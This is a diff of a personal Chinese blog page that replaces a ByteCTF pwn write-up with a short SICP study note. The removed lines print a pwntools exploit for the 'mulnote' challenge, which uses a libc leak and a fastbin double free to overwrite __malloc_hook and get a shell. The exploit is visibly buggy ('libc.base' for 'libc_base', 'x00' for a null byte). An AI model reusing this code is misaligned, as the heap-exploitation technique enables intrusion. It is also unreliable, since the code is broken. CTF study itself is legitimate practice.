@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="SICP,">
 
 
 
@@ -88,18 +88,18 @@
 
 
 
-<meta name="description" content="mulnote简单的组合攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./mulnote&apos;)elf = ELF(&apos;mulnot">
-<meta name="keywords" content="pwn">
+<meta name="description" content="记录一下在学习过程中突然对以前知识的一些领悟 为何c++中要建立套娃一样的多次define这一点在SICP的学习中有很好的体现。 教授所说: 如果有人向你介绍一门新语言，你应该问他。 1.构成语言的基本元素有哪些。 2.组合的方法是什么（允许你将这些元素组合到一起，以构建更大的对象的方法是什么） 3.抽象的方法是什么 （我们如何利用这些元素，并将他们封装） 所以，c++中的多次define，就是体">
+<meta name="keywords" content="SICP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="byte ctf (pwn)">
-<meta property="og:url" content="http://yoursite.com/2019/10/18/byte ctf (pwn)/index.html">
+<meta property="og:title" content="学习SICP记录">
+<meta property="og:url" content="http://yoursite.com/2020/06/14/学习SICP记录/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="mulnote简单的组合攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./mulnote&apos;)elf = ELF(&apos;mulnot">
+<meta property="og:description" content="记录一下在学习过程中突然对以前知识的一些领悟 为何c++中要建立套娃一样的多次define这一点在SICP的学习中有很好的体现。 教授所说: 如果有人向你介绍一门新语言，你应该问他。 1.构成语言的基本元素有哪些。 2.组合的方法是什么（允许你将这些元素组合到一起，以构建更大的对象的方法是什么） 3.抽象的方法是什么 （我们如何利用这些元素，并将他们封装） 所以，c++中的多次define，就是体">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-05-17T09:53:00.352Z">
+<meta property="og:updated_time" content="2020-06-14T07:46:40.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="byte ctf (pwn)">
-<meta name="twitter:description" content="mulnote简单的组合攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./mulnote&apos;)elf = ELF(&apos;mulnot">
+<meta name="twitter:title" content="学习SICP记录">
+<meta name="twitter:description" content="记录一下在学习过程中突然对以前知识的一些领悟 为何c++中要建立套娃一样的多次define这一点在SICP的学习中有很好的体现。 教授所说: 如果有人向你介绍一门新语言，你应该问他。 1.构成语言的基本元素有哪些。 2.组合的方法是什么（允许你将这些元素组合到一起，以构建更大的对象的方法是什么） 3.抽象的方法是什么 （我们如何利用这些元素，并将他们封装） 所以，c++中的多次define，就是体">
 
 
 
@@ -129,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/18/byte ctf (pwn)/">
+  <link rel="canonical" href="http://yoursite.com/2020/06/14/学习SICP记录/">
 
 
 
 
 
-  <title>byte ctf (pwn) | zhz'blog</title>
+  <title>学习SICP记录 | zhz'blog</title>
   
 
 
@@ -296,7 +296,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/18/byte ctf (pwn)/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/14/学习SICP记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zhz">
@@ -313,7 +313,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">byte ctf (pwn)</h1>
+          <h1 class="post-title" itemprop="name headline">学习SICP记录</h1>
         
 
         <div class="post-meta">
@@ -325,8 +325,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-18T12:23:44+08:00">
-                2019-10-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-14T15:27:33+08:00">
+                2020-06-14
               </time>
             
 
@@ -399,9 +399,13 @@
       
 
       
-        <h3 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h3><p>简单的组合攻击</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./mulnote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'mulnote'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">choice</span><span class="params">(achar)</span>:</span></span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,achar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">        	sh.sendline(<span class="string">'C'</span>)</span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,str(size))</span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">        	sh.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        	sh.sendline(<span class="string">'R'</span>)</span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        	sh.sendline(<span class="string">'E'</span>)</span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line">        	sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################leak libc#####################</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'A'</span>)</span><br><span class="line">show()</span><br><span class="line">libc = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-4</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"libc = %s"</span>%hex(libc))</span><br><span class="line">libc_base = libc - <span class="number">0x3c</span></span><br><span class="line">log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + lib.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = libc.base + <span class="number">0x45216</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>)) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'x00'</span>*<span class="number">0x13</span>+p64(one)) <span class="comment">#8</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'C'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'size&gt;'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
+        <p>记录一下在学习过程中突然对以前知识的一些领悟</p>
+<h4 id="为何c-中要建立套娃一样的多次define"><a href="#为何c-中要建立套娃一样的多次define" class="headerlink" title="为何c++中要建立套娃一样的多次define"></a>为何c++中要建立套娃一样的多次define</h4><p>这一点在SICP的学习中有很好的体现。</p>
+<p>教授所说: 如果有人向你介绍一门新语言，你应该问他。</p>
+<p>1.构成语言的基本元素有哪些。</p>
+<p>2.组合的方法是什么（允许你将这些元素组合到一起，以构建更大的对象的方法是什么）</p>
+<p>3.抽象的方法是什么 （我们如何利用这些元素，并将他们封装）</p>
+<p>所以，c++中的多次define，就是体现第三个问题，如何以此为基础(可以是最基础的元素，也可以是你抽象化后的东西)将其抽象化，以满足你构建更大盒子的需求。</p>
 
       
     </div>
@@ -411,6 +415,37 @@
 <div>
     
       
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2020/06/14/学习SICP记录/">学习SICP记录</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 zhz 的个人博客">zhz</a></p>
+  <p><span>发布时间:</span>2020年06月14日 - 15:06</p>
+  <p><span>最后更新:</span>2020年06月14日 - 15:06</p>
+  <p><span>原始链接:</span><a href="/2020/06/14/学习SICP记录/" title="学习SICP记录">http://yoursite.com/2020/06/14/学习SICP记录/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2020/06/14/学习SICP记录/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
     
   </div>
    
@@ -428,7 +463,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/10/18/byte ctf (pwn)/" title="byte ctf (pwn)">http://yoursite.com/2019/10/18/byte ctf (pwn)/</a>
+    <a href="http://yoursite.com/2020/06/14/学习SICP记录/" title="学习SICP记录">http://yoursite.com/2020/06/14/学习SICP记录/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -443,7 +478,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+            <a href="/tags/SICP/" rel="tag"><i class="fa fa-tag"></i> SICP</a>
           
         </div>
       
@@ -456,8 +491,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/18/buuctf pwn的刷题之旅（长期更）/" rel="next" title="buuctf pwn的刷题之旅（长期更）">
-                <i class="fa fa-chevron-left"></i> buuctf pwn的刷题之旅（长期更）
+              <a href="/2020/05/17/STL-type-traits-h/" rel="next" title="STL_type_traits.h">
+                <i class="fa fa-chevron-left"></i> STL_type_traits.h
               </a>
             
           </div>
@@ -466,8 +501,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/10/18/c++学习笔记 （c++编程基础）/" rel="prev" title="c++学习笔记（c++编程基础）">
-                c++学习笔记（c++编程基础） <i class="fa fa-chevron-right"></i>
+              <a href="/2020/06/16/lexer代码骨架整理/" rel="prev" title="lexer代码骨架整理">
+                lexer代码骨架整理 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -600,7 +635,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#mulnote"><span class="nav-number">1.</span> <span class="nav-text">mulnote</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#为何c-中要建立套娃一样的多次define"><span class="nav-number">1.</span> <span class="nav-text">为何c++中要建立套娃一样的多次define</span></a></li></ol></div>
             
 
           </div>
